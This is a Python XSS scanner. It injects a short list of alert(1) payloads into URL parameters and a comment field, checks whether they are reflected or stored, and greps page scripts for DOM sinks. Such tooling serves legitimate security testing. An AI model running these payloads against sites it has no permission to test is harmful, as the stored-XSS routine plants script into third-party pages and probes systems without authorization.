import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re

# Common XSS payloads
PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "\"'><svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (XSS Scanner Bot)"
}

def is_reflected(response_text, payload):
    """Check if payload is reflected in the response body."""
    # Simple case-insensitive check
    return payload.lower() in response_text.lower()

def scan_reflected_xss(url):
    """Try injecting payloads into each parameter to detect reflected XSS."""
    results = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return ["No parameters to test for XSS."]

    for param in params:
        for payload in PAYLOADS:
            # Inject payload into the param
            new_params = params.copy()
            new_params[param] = payload
            new_query = urlencode(new_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                resp = requests.get(test_url, headers=HEADERS, timeout=5)
                if is_reflected(resp.text, payload):
                    results.append(f"❗ Possible reflected XSS in parameter '{param}' with payload: {payload}")
                    break  # stop testing other payloads for this param
            except requests.RequestException as e:
                results.append(f"❌ Error testing parameter '{param}': {e}")
                break

    if not results:
        results.append("No reflected XSS vulnerabilities detected.")
    return results

def scan_dom_xss(url):
    """Heuristic check for DOM-based XSS (basic, searching for vulnerable scripts)."""
    results = []
    try:
        resp = requests.get(url, headers=HEADERS, timeout=5)
        scripts = re.findall(r"<script[^>]*>(.*?)</script>", resp.text, re.DOTALL | re.IGNORECASE)

        patterns = [
            r"document\.location",
            r"document\.URL",
            r"eval\(",
            r"innerHTML",
            r"document\.write",
            r"window\.location",
        ]

        for script in scripts:
            for pattern in patterns:
                if re.search(pattern, script):
                    results.append(
                        f"⚠️ Possible DOM-based XSS vulnerability pattern found: '{pattern}' in script block."
                    )

        if not results:
            results.append("No obvious DOM-based XSS patterns detected.")

    except requests.RequestException as e:
        results.append(f"❌ Error fetching page for DOM-based XSS scan: {e}")

    return results

def scan_stored_xss(test_injection_url, stored_page_url):
    """
    Simulate stored XSS by injecting payload into a form or URL,
    then checking the display page to confirm persistence.
    """
    results = []

    for payload in PAYLOADS:
        try:
            inj_url = f"{test_injection_url}?comment={payload}"
            inj_resp = requests.get(inj_url, headers=HEADERS, timeout=5)
            stored_resp = requests.get(stored_page_url, headers=HEADERS, timeout=5)

            if is_reflected(stored_resp.text, payload):
                results.append(f"Possible stored XSS detected with payload: {payload}")
                break  # stop after finding the first success

        except requests.RequestException as e:
            results.append(f"❌ Error during stored XSS test: {e}")
            break

    if not results:
        results.append("No stored XSS vulnerabilities detected.")

    return results


def scan_xss(target_url, stored_test=None):
    """
    Run full XSS scan:
    - Reflected XSS
    - DOM-based XSS
    - Stored XSS (optional)

    Args:
      target_url: URL to test for reflected and DOM XSS.
      stored_test: tuple of (injection_url, stored_page_url) for stored XSS simulation.

    Returns:
      list of results strings.
    """
    results = [f"Starting XSS scan on: {target_url}"]

    # Reflected XSS
    results += scan_reflected_xss(target_url)

    # DOM-based XSS heuristic
    results += scan_dom_xss(target_url)

    # Stored XSS simulation
    if stored_test and isinstance(stored_test, tuple) and len(stored_test) == 2:
        results += scan_stored_xss(stored_test[0], stored_test[1])

    return results
